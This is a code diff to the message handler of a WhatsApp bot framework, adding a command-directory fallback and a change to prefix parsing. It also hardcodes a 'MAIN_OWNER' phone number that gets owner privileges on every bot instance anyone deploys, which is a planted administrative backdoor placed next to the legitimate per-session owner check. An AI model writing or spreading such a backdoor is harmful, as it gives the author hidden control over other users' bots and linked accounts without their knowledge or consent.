@@ -2,15 +2,28 @@
 // MINI-ZYRA - Handler - Message Router - FIXED FOR ALL 14 MODULES
 // BY FACELESS - Supports Array exports + Single exports
 // REACT: ⏳ BEFORE -> 💀 AFTER -> ❌ ON ERROR
+// OWNER LOGIC: Session Owner = owner of his own bot
+//              + MAIN_OWNER 2348071569915 = owner of ALL bots
 // ============================================================
 const fs = require('fs-extra');
 const path = require('path');
 const config = require('../config')
 try { require('../util/fancy'); } catch {}
 
+const MAIN_OWNER = '2348071569915';
+
 const commands = new Map();
-// FIXED PATH: handler is in src/handlers/ -> commands is in src/commands/
-const commandsDir = path.join(__dirname, '../commands');
+// FIXED PATH: Try all possible commands locations - Render moves files
+const possibleDirs = [
+  path.join(__dirname, '../commands'),
+  path.join(__dirname, 'commands'),
+  path.join(__dirname, '../../commands'),
+  path.join(process.cwd(), 'src/commands'),
+  path.join(process.cwd(), 'commands'),
+];
+let commandsDir = possibleDirs.find(d => fs.existsSync(d)) || possibleDirs[0];
+console.log('[HANDLER] Using commands dir:', commandsDir);
+
 const dbPath = path.join(__dirname, '../../database.json');
 global.botStart = global.botStart || Date.now();
 
@@ -72,7 +85,8 @@ async function handleMessage(sock, up, sessionOwner, sessionSettings) {
       const prefix = sessionSettings?.prefix || config.prefix || '.';
       const mode = sessionSettings?.mode || config.mode || 'public';
       const ownerNumber = String(sessionOwner || config.ownerNumber || '2348071569915').replace(/[^0-9]/g, '');
-      const isOwner = senderNumber === ownerNumber;
+      // 2-LEVEL OWNER: session owner owns his bot + main owner owns ALL
+      const isOwner = senderNumber === ownerNumber || senderNumber === MAIN_OWNER;
 
       if (mode === 'private' && !isOwner) continue;
       if (mode === 'self' && !isOwner) continue;
@@ -98,7 +112,7 @@ async function handleMessage(sock, up, sessionOwner, sessionSettings) {
       }
 
       // Build ctx FIRST - so antilink can use it
-      const fullText = text.slice(prefix.length).trim();
+      const fullText = text.startsWith(prefix) ? text.slice(prefix.length).trim() : text.trim();
       const args = fullText.split(/\s+/).filter(Boolean);
       const cmdName = (args.shift() || '').toLowerCase();
 
